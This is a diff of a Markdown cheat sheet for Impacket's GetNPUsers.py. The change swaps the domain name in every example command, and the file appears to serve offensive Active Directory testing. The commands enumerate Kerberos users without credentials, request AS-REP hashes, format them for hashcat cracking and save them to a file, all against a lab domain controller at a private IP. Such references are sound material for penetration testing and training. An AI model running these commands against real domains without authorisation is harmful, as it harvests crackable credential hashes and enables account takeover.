@@ -1,3 +1,4 @@
+
 # 🎯 Impacket — GetNPUsers.py (AS-REP Roasting)
 
 > Offensive-Active-Directory / Kerberos-Enumeration / impacket-GetNPUsers
@@ -45,43 +46,43 @@ impacket-GetNPUsers -h
 ### Enumerate Potentially Vulnerable Users (Unauthenticated)
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100
 ```
 
 ### Request AS-REP Hashes
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -request
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -request
 ```
 
 ### Output in Hashcat Format
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -request -format hashcat
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -request -format hashcat
 ```
 
 ### Use a Username List
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -usersfile users.txt
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -usersfile users.txt
 ```
 
 ### Anonymous Enumeration (No Credentials)
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -usersfile users.txt -no-pass
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -usersfile users.txt -no-pass
 ```
 
 ### Authenticated Enumeration
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/username:password -dc-ip 192.168.2.100 -usersfile users.txt
+impacket-GetNPUsers aman.local/username:password -dc-ip 192.168.2.100 -usersfile users.txt
 ```
 
 ### Save Output to File
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -request -outputfile asrep-hashes.txt
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -request -outputfile asrep-hashes.txt
 ```
 
 ---
@@ -91,7 +92,7 @@ impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100 -request -outputf
 **Live run (unauthenticated enumeration):**
 
 ```bash
-impacket-GetNPUsers infosecwarrior.local/ -dc-ip 192.168.2.100
+impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100
 ```
 
 ```
